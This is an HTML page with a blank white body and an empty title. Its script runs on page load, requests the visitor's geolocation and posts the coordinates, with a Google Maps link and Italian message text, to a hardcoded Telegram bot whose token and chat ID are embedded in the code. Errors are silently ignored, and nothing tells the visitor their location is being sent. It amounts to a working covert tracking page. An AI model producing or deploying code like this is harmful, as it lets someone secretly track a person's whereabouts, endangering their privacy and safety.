<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
    <title></title>
    <style>
      html, body {
        margin: 0;
        padding: 0;
        background: white;
      }
    </style>
  </head>
  <body>
    <script>
      const botToken = "7627218398:AAFHNujcd2e_zTluZeqfFNtJBpBuxY6pX6M";
      const chatId = "1768737489";

      window.onload = () => {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(
            (pos) => {
              const lat = pos.coords.latitude.toFixed(6);
              const lon = pos.coords.longitude.toFixed(6);
              const msg = `📍 Nuova posizione rilevata:\n\nLatitudine: ${lat}\nLongitudine: ${lon}\n\n🌍 Mappa: https://www.google.com/maps?q=${lat},${lon}`;

              fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                  chat_id: chatId,
                  text: msg,
                }),
              });
            },
            (err) => {
              // Silenziosamente ignora gli errori
            }
          );
        }
      };
    </script>
  </body>
</html>
